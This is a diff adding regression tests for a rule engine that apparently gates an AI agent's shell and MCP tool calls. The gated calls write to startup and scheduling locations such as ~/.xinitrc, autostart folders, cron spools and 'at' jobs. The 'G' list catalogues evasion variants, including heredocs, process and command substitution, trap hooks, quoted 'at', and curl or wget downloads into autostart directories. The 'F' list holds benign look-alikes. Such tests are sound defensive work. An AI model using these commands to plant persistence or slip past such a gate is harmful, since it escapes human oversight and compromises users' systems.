@@ -608,3 +608,47 @@ def test_r3b_bypasses_closed(cmd):
 def test_r3b_yq_inplace_gated():
     assert _hit(evaluate(_shell("yq -i .a /home/u/.config/autostart/x.desktop"), EMPTY))
     assert evaluate(_shell("yq .a /home/u/.config/autostart/x.desktop"), EMPTY).rule != RULE
+
+
+# ---- QA round 4 regressions ----------------------------------------------------
+
+def _r4_sh(c, cwd=None):
+    return _shell(c, cwd=cwd)
+
+
+def _r4_mcp(t, **a):
+    return _mcp(t, **a)
+
+
+def _r4_cases():
+    sh, mcp = _r4_sh, _r4_mcp
+    G=[sh("cat <<EOF > ~/.xinitrc\nx\nEOF"),sh("cat <<'EOF' >> /etc/periodic/daily/500.x\nx\nEOF"),sh("cat <<-EOF | sudo tee /var/spool/cron/crontabs/root\nx\nEOF"),
+    sh("cat <<EOF >~/.config/plasma-workspace/env/a.sh\nx\nEOF"),sh("cat <<< x >/etc/periodic/daily/a\necho done"),
+    sh("python3 - <<'EOF'\nopen(\"/home/u/.xinitrc\",\"w\").write(\"x\")\nEOF"),mcp("mcp__jupyter__run_cell",code="open('/home/u/.xinitrc','w').write('x')"),
+    sh("cp <(echo x) ~/.xinitrc"),sh("cp <(echo x) /etc/periodic/daily/a"),sh("install -m 644 <(echo x) ~/.config/autostart/a.desktop"),sh("echo x > >(tee ~/.xinitrc)"),
+    sh("out=$(cp /tmp/x ~/.xinitrc)"),sh("echo $(echo x > ~/.xinitrc)"),sh("x=`tee ~/.xinitrc < /tmp/x`"),sh("ls $(cp /tmp/x ~/.config/autostart/a.desktop)"),
+    sh("cd ~/.config/autostart && curl -O https://e.com/a.desktop"),sh("cd ~/.config/autostart && curl --remote-name https://e.com/a.desktop"),sh("cd /etc/periodic/daily && wget -q https://e.com/a"),
+    sh("cd ~/.config/autostart && tar xzf /tmp/a.tgz"),sh("cd /var/spool/cron/crontabs && tar xf /tmp/a.tar"),sh("cd ~/.config/plasma-workspace/env && unzip -o /tmp/a.zip"),
+    sh("cd ~/.config/autostart && 7z x /tmp/a.7z"),sh("curl -O https://e.com/a.desktop", cwd="/home/u/.config/autostart"),
+    sh("echo x | at \"$(date -d '+1 min' +%H:%M)\""),sh("echo x | at $(date +%H:%M)"),sh("echo x | at ${T:-now}"),
+    sh("sort -uo ~/.config/autostart/a.desktop /tmp/x"),sh("sort -uo~/.xinitrc /tmp/x"),sh("tar -xf a.tar -C~/.config/autostart"),sh("tar -xf a.tar --one-top-level=/home/u/.config/autostart"),
+    sh("unzip -d~/.config/autostart a.zip"),sh("yq -i '.a=1' ~/.config/autostart/a.desktop"),sh("awk 'BEGIN{print \"x\" > \"/home/u/.xinitrc\"}'"),sh("trap 'cp /tmp/x ~/.xinitrc' EXIT"),
+    sh("echo x | \"at\" now"),sh("echo x | 'at' now"),
+    mcp("mcp__fs__create_file",name="/home/u/.xinitrc",content="x"),mcp("mcp__fs__write_file",pathname="/home/u/.xinitrc",content="x"),mcp("mcp__fs__save",filename="a.desktop",directory="/home/u/.config/autostart",content="x")]
+    F=[mcp("mcp__gmail__send_email",body="Hi,\nat noon tomorrow works."),mcp("mcp__slack__send_message",text="Deploy finished\nat 5pm"),mcp("mcp__x__process_document",text="Report\nat 10:00 done"),
+    mcp("mcp__ci__run_workflow",workflow="batch"),mcp("mcp__runner__run_tests",filter="at now"),sh("python3 -c \"print('at 10:30 the job ran')\""),sh("node -e \"console.log('batch')\""),sh("python3 -c \"x=('batch')\""),
+    sh("git commit -m \"$(cat <<'EOF'\nfix\nat decode time\nEOF\n)\""),sh("tar czf backup.tgz ~/.config/autostart"),sh("cd ~/.config/autostart && ls"),sh("cd /tmp && curl -O https://e.com/x"),
+    sh("echo \"$(date)\" > log.txt"),sh("diff <(cat ~/.xinitrc) other"),mcp("mcp__shell__run_command",command="echo hi")]
+    return G, F
+
+
+@pytest.mark.parametrize("i", range(len(_r4_cases()[0])))
+def test_r4_gaps_closed(i):
+    ev = _r4_cases()[0][i]
+    assert _gated(evaluate(ev, EMPTY)), ev.args
+
+
+@pytest.mark.parametrize("i", range(len(_r4_cases()[1])))
+def test_r4_no_false_positives(i):
+    ev = _r4_cases()[1][i]
+    assert evaluate(ev, EMPTY).rule != RULE, ev.args
